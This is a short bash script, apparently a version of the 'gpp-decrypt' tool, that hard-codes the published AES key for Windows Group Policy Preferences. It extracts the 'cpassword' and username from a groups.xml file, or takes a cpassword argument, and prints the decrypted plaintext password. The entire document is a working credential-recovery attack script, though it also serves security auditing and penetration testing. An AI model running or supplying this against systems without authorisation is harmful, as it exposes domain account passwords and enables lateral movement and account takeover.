#!/bin/bash

# Known AES key for GPP encryption
AES_KEY='4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'

# Function to decrypt GPP password
decrypt() {
    local cpass="$1"
    local decoded padding

    # Add necessary padding
    padding=$(printf '%*s' $((4 - ${#cpass} % 4)) "")
    padding=${padding// /=}
    cpass="${cpass}${padding}"

    # Decode from base64 and decrypt
    decoded=$(echo "$cpass" | base64 -d | openssl aes-256-cbc -d -A -iv 00000000000000000000000000000000 -K $AES_KEY 2>/dev/null)

    echo "$decoded"
}

# Function to process XML file and extract cpassword
process_file() {
    local file="$1"

    if [[ ! -f "$file" ]]; then
        echo "Sorry, file not found!"
        exit 1
    fi

    # Use xmllint to parse XML and extract needed information
    local username=$(xmllint --xpath "string(//User/@name)" "$file" 2>/dev/null)
    local cpassword=$(xmllint --xpath "string(//Properties/@cpassword)" "$file" 2>/dev/null)

    if [[ -n "$username" ]]; then
        echo "Username: $username"
    else
        echo "Username not found!"
    fi

    if [[ -n "$cpassword" ]]; then
        local decrypted=$(decrypt "$cpassword")
        echo "Password: $decrypted"
    else
        echo "Password not found!"
    fi
}

# Main function
main() {
    if [[ "$#" -lt 1 ]]; then
        echo "Usage: $0 -f [groups.xml] OR -c [cpassword]"
        exit 1
    fi

    while getopts ":f:c:" opt; do
        case $opt in
            f) process_file "$OPTARG" ;;
            c) echo "Password: $(decrypt "$OPTARG")" ;;
            \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
            :) echo "Option -$OPTARG requires an argument." >&2; exit 1 ;;
        esac
    done
}

# Execute main function with all passed arguments
main "$@"
